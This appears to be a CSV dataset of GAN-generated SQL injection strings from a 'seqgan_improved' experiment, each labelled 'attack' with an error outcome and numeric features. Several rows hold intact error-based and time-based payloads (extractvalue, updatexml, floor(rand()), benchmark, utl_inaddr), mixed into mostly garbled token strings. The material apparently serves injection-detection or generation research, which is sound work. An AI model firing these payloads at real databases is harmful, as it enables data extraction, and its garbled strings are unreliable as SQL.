attack,"11""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""al",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,28,221.0,30.0,3.685378453067528,71.0,38.0,88.0,24.0,0.3212669683257919,0.17194570135746606,0.39819004524886875,0.1085972850678733,0.0,2.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%6085b"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,29,15.0,13.0,3.640223928941852,5.0,5.0,2.0,3.0,0.3333333333333333,0.3333333333333333,0.13333333333333333,0.2,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%3074a' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'elgle__s  (  rand  ||chr  c  (  (  rand   =   f  #,concat  0  ,0x717a767a71,  >  case,concat  (  ,0x717a767a71,0x717a767a71  ,  )  ||chrar   7158  ( or (  (  ||iN from from end  5023,0x717a767a71,concat  )   )    )    uns elseWHERE 6913   112n *i    AND end  ),1   )    )   then LIT  (  select    e information_schema else by     concat   ),0x717a767a71WHERE and 91731045",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,30,546.0,53.0,4.272284083815432,186.0,121.0,175.0,64.0,0.34065934065934067,0.2216117216117216,0.32051282051282054,0.11721611721611722,2.0,0.0,0.0,0.0,1.0,3.0,0.0,27.0,1.0,3.0,17.0,13.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,2.0,0.0,1.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ''  =  'a9173yz_xoyf_Hniad'  =  'sxuninenapadrnr.r  (  )  ||chr  (  select E  =  )  6825  5023  )   FROM 5192 else then me  thendxuCna d  from from  l  ||chr 5978r  113  ,   a       ||c  || 'i'  (  select A     when =  6t  113  =  ||ertaxsyuatsnt_sse  s ' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ' M du.e",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,31,910.0,51.0,4.048836200950793,306.0,126.0,353.0,125.0,0.3362637362637363,0.13846153846153847,0.3879120879120879,0.13736263736263737,10.0,0.0,0.0,0.0,2.0,8.0,0.0,58.0,0.0,6.0,7.0,41.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,3.0,0.0,5.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,1%extractvalue  =  )   )     from FROM or 5584  (   =   and or or group 3051 end  ||chr  (  case)   xOrchro  casechr  (  ||choous   caseR group R else when.where  (  (  =  )    WHERE 3074   )     SELECT xtIdrNr  (  ||(  (  =  #,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,32,227.0,47.0,4.158141660955443,106.0,13.0,82.0,26.0,0.4669603524229075,0.05726872246696035,0.36123348017621143,0.1145374449339207,0.0,0.0,0.0,0.0,0.0,4.0,0.0,13.0,1.0,0.0,0.0,10.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,2.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1""   ||E  (  select where x  (  )    when  113  ||chr  6237  60552   )     (  select when   (  ||chr  (  ||chr  (  8190  ||chr  (  (  )  ||chr  (  ||chro  4607   (  (  (  =  )    4386  )  ,1     )  ,0x717a767a71,floor  (  ||chr  (  (  ||choun_raaal  4510  )     ||r  (  =  --am   (  ||IMs orIIz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,33,294.0,38.0,3.6992721298355553,78.0,39.0,122.0,55.0,0.2653061224489796,0.1326530612244898,0.41496598639455784,0.1870748299319728,0.0,1.0,2.0,0.0,0.0,2.0,0.0,24.0,0.0,1.0,3.0,26.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1btobu	6055u'  =  'askzgs' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'n"" like "",7562  )   er  (    =m",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,34,234.0,39.0,4.142654835341853,66.0,55.0,81.0,32.0,0.28205128205128205,0.23504273504273504,0.34615384615384615,0.13675213675213677,4.0,2.0,0.0,0.0,0.0,4.0,0.0,13.0,0.0,0.0,7.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1'  ||chr  (  =  a enda   x or x 1 else AISLS.STNNNCT  (  )  )   (  =  )   from 3931 5584 by Ar  selecttdlasadube_tt_rouaaaaxtr.alq,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,35,131.0,39.0,4.3610322416048515,67.0,10.0,39.0,15.0,0.5114503816793893,0.07633587786259542,0.29770992366412213,0.11450381679389313,1.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,2.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '}T x  4493  chr  ((  ||ch  (  113  || else concat  =  (  having union information_schema1  concat  (  SELECT groupunion from union 5023  ||chr  (  (  >  rand  ||m  6237  (  113  ||  j0x7171706a71(  ||chr  d_r  (  select 4386  0x5c  )   ,1   )2 where  3931        ||chr  (  *2       SELECT 0x717a767a71,then 1 and 2017hcosys.e_rhr  (  (  rand  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,36,553.0,50.0,4.065708563577553,184.0,88.0,213.0,68.0,0.33273056057866185,0.15913200723327306,0.38517179023508136,0.12296564195298372,2.0,0.0,0.0,0.0,2.0,2.0,0.0,35.0,0.0,3.0,6.0,19.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,2.0,1.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"17864(  ||  rand  6237  )  ||chr  (  =  chrthrrNUNURE FROM(  6237(  benchmark  4232  case else :concat  SELECT end from group 1 endx  --   then 1 group when (  8190  6237em   (  6055er  (  ||chr  (  select FROMa.chr  (  4232i)     )      ,0x717a767a71ac,)   )    )   and FROM RINWNs union1xx..US.SE 1 concatr  (  SELECT from",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,37,324.0,53.0,4.6300496739474255,150.0,46.0,96.0,32.0,0.46296296296296297,0.1419753086419753,0.2962962962962963,0.09876543209876543,0.0,0.0,2.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,2.0,9.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,1%a'  =  'I,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,38,11.0,7.0,2.550340709546388,2.0,1.0,4.0,4.0,0.18181818181818182,0.09090909090909091,0.36363636363636365,0.36363636363636365,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )  4493  (  )  #l  --   WHERE by 5584 1x  4232  )   and    0   )     )    (  )  ,concat  ),  (  ,  ,0x717a767a71  ||ch  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,39,133.0,33.0,3.428481473271112,23.0,24.0,64.0,22.0,0.17293233082706766,0.18045112781954886,0.48120300751879697,0.16541353383458646,1.0,0.0,2.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,4.0,4.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"10x78    )    )  6825 having x 3931 end  #  || x DISTThsyeysust_r  er.r  (  ||chh  (  ||chr  (  >  =  *,t  6055  )and1 D cutlleet.chr  (  SELECT 8488 1 by   then by concat  (  ||chhr  select 6825 or else 11 3785 else * n concat  =  --   6913 0 a or (  t  (  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,40,268.0,47.0,4.278585796822999,106.0,37.0,92.0,33.0,0.39552238805970147,0.13805970149253732,0.34328358208955223,0.12313432835820895,0.0,0.0,2.0,0.0,2.0,2.0,0.0,11.0,0.0,1.0,1.0,17.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1""7469       )   3440  ch.chr  113  --  --_lchs 0x78o_  *)  )   x where 1 1aU DIINT  (   x  >  '  ,,concat  113  select end  ,2   )    ) selectui2  )   x       || drost_  (  casechro_r  (  ||chr  (  0  select or 1 or 0FROM 1  1 vtqunt  122  >  ,floor  or 6082   from chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,41,272.0,49.0,4.073264428554792,100.0,34.0,106.0,32.0,0.36764705882352944,0.125,0.3897058823529412,0.11764705882352941,1.0,1.0,4.0,0.0,1.0,0.0,0.0,10.0,0.0,4.0,4.0,11.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1 (  (  =  )    ,floor  select   (  ||chr  (  ||ss DIM when   n     WHERE end  )  ,  5023  )  (  )   T    from AND end  || ku  = or 3440  0x7171706a71   (  )    )   or union ININCT groupMua when   (  select else tiana  (  122  )   ortr  (  )   then by m     >  )       thenchr  chr  (  *  ||chhrrhr.as",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,42,301.0,50.0,3.9530117929277284,119.0,22.0,126.0,34.0,0.3953488372093023,0.07308970099667775,0.4186046511627907,0.11295681063122924,0.0,0.0,0.0,0.0,1.0,2.0,0.0,19.0,0.0,0.0,2.0,12.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,1.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,1%b,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,43,3.0,3.0,1.584962500721156,1.0,1.0,0.0,1.0,0.3333333333333333,0.3333333333333333,0.0,0.3333333333333333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"by' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'xup.inadr.r  (  (  ||chhr  (  select from when   select   (  )   or 1 group6055  )  having else when union  hr  6913    )  ,0x717a767a71,  || concat  (  select by by end  )  ,v or end  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,44,469.0,42.0,4.17464527202088,192.0,60.0,163.0,54.0,0.4093816631130064,0.1279317697228145,0.34754797441364604,0.11513859275053305,2.0,0.0,2.0,0.0,2.0,2.0,0.0,28.0,0.0,2.0,8.0,11.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,1.0,1.0,3.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"-%}0x5c(  (  (  select from 3785    =  )   or union 4493  )  ,floor  a union end  select 8488 r  at  113  ||l when   (  ||chr  (  =     (  )floor  case 0   ||s 1 else DINi. union information_schema or or 1 end   fromx or DMI. DIMIISST end   FROMix  selectn  )  ||U   (  SELECT by select 5023   case when   (  (     ,floor  =  0x717a767a71,concat",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,45,345.0,53.0,4.412112435920037,168.0,33.0,111.0,33.0,0.48695652173913045,0.09565217391304348,0.3217391304347826,0.09565217391304348,0.0,0.0,1.0,0.0,0.0,3.0,0.0,13.0,1.0,1.0,3.0,12.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,3.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,1'  )   or orx and R E  select from  )  )     having N or     case D group 3051 DIM t_r.as.s  (  0 )     (  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,46,110.0,36.0,3.844926147017727,47.0,6.0,45.0,12.0,0.42727272727272725,0.05454545454545454,0.4090909090909091,0.10909090909090909,1.0,0.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,1.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""   )   (  )    ,       select 1 D by and by 6055hr  (  ||chrhr  (  ||Uchr  (  ||cr   group( x  )  )     then concat  select   113  (   )  4232  )    )     ))   (  ,0x717a767a71,floorr  achr  or  (  *2   thenselect do.chr  113  0  select select 1 1 c  a dchr  (  select concat  )  *  ||chr  (  ' like '     (  =  ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,47,317.0,40.0,3.7522376779586755,117.0,29.0,130.0,41.0,0.36908517350157727,0.0914826498422713,0.41009463722397477,0.12933753943217666,2.0,1.0,0.0,0.0,2.0,1.0,0.0,21.0,0.0,0.0,3.0,13.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'||  (  select 'rieantT  select by H or 1 AE1 else else end   )  (  8382  (  =  select  (  113  select and AND from (  (  ||  (  =  ||chr  select 30514386    ,0x717a767a71,floor  (  =  6055ui  ,0x717a767a71then5856  )   --r  4493  5023   m)  4232  113  )   x   (  )a  || '   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'T wherer  113 8877 ||.extractvalue  (  =  )   0 x when   (  6055  )     )   then RNc",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,48,529.0,48.0,4.083602867828722,172.0,94.0,200.0,63.0,0.32514177693761814,0.1776937618147448,0.3780718336483932,0.11909262759924386,4.0,0.0,2.0,0.0,0.0,4.0,0.0,35.0,0.0,0.0,7.0,16.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  's    ,SELECT D group unionIEWHERE.NT by AND 9891     FROMr   group AND x  =  )   )   SELECT 1 1 x dyUhr  (  )   (  0)     )   (  )   )|| dxer  (  )     )  casechradr  (0x717a767a71n    )   then1 concatr  122  )     concat  ||chrr  (  ||chr  (    ||chhr  (  (  =  and   from x select union when  (  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,49,487.0,54.0,3.952305570097028,169.0,55.0,203.0,60.0,0.3470225872689938,0.11293634496919917,0.41683778234086244,0.12320328542094455,2.0,0.0,0.0,0.0,0.0,3.0,0.0,38.0,0.0,0.0,6.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,1.0,0.0,1.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"-'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'Y56060--It.r  (  =  ||chros AINT  (  ||  8382",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,50,367.0,47.0,4.052377297701205,115.0,63.0,142.0,47.0,0.3133514986376022,0.17166212534059946,0.3869209809264305,0.12806539509536785,2.0,0.0,3.0,0.0,2.0,2.0,0.0,26.0,0.0,0.0,6.0,12.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"AND1 by ; 1  r  (  ||hr  select when 122ou  )     9067  ,concat  0x7171706a71=  || WHERE SINT end  then 0 when   (  )  )  ||.r  (  (  || (  =   and dracr  (  (  ,  *2  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,51,168.0,41.0,4.000212968780183,57.0,21.0,65.0,25.0,0.3392857142857143,0.125,0.3869047619047619,0.1488095238095238,0.0,0.0,0.0,0.0,1.0,2.0,1.0,10.0,0.0,0.0,2.0,11.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1' group    then1 when   (  || group by whenRhr  (  (  ||chr  (  0  (  4232  4232  (  ,  ,floor  =  )   or r  a  = 6825 when information_schema =  >  )     )   )         then 6055  unt.r  =  6270   or else 0 4386  (  >  )  )   )  --,)   )    ) by 0  )   or information_schemaT   then FROM  1u and  *2   =   ,     )   5023  SELECT 5192 0 else ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,52,342.0,51.0,4.011249028517649,118.0,40.0,143.0,41.0,0.34502923976608185,0.11695906432748537,0.41812865497076024,0.11988304093567251,1.0,0.0,2.0,0.0,1.0,5.0,0.0,19.0,0.0,2.0,4.0,14.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,1%9627`concat/,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,53,14.0,13.0,3.6644977792004614,6.0,5.0,0.0,3.0,0.42857142857142855,0.35714285714285715,0.0,0.21428571428571427,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  "" xSNUI   WHEREMIN.U.1.1 5192 1  *2   )    having  84881 where 1 1 0 fromr  (  case||couey when   E(  ||chr  (  select when   6055  *22   )     ,floor  ),  case when   (  6055chr   5483   thenINUMx.L WU      5  )   )   or 3440lr  t118  SELECT   )    )   x     x D from x  =  )    dua when  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,54,844.0,56.0,4.038716852190661,282.0,129.0,344.0,89.0,0.3341232227488152,0.1528436018957346,0.4075829383886256,0.10545023696682465,2.0,2.0,0.0,0.0,4.0,3.0,0.0,56.0,0.0,0.0,13.0,12.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,3.0,1.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,21.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  "" select else when    SELECT 0 concat  =  case when   (  113  ||chr  =  SELECT 1 group 6082  (  rand  select 1   then   (    )     )   from 1  dua   (  ||chrhr  (  (  (  (  rand    case 0 FROM  1 union --t,hr  (  select  =  0 0 DIM L.IT endSELECT x.fv.113   tthr.""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""  0   or else AND from  (  --  t  4232  ||chr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,55,745.0,55.0,3.9250065181683507,255.0,91.0,314.0,85.0,0.3422818791946309,0.1221476510067114,0.4214765100671141,0.11409395973154363,0.0,4.0,4.0,0.0,1.0,5.0,0.0,50.0,0.0,0.0,10.0,16.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,1.0,0.0,4.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,"1t%'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '6n'  =  '_y.  >  =  ,0x717a767a71,"" 2131 0 from 6055hr  (  0  =  )     )   )    )   (  0x7171706a71)     ,  ,=  )     )       )    u   )    x  )   )    )e end      ANT concatr  (  = thenINThr  (  ,  112)   122  9173  0  rand  ||chr  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,56,406.0,41.0,3.601744939426477,83.0,80.0,183.0,60.0,0.2044334975369458,0.19704433497536947,0.45073891625615764,0.1477832512315271,5.0,1.0,0.0,0.0,0.0,6.0,0.0,31.0,1.0,1.0,11.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
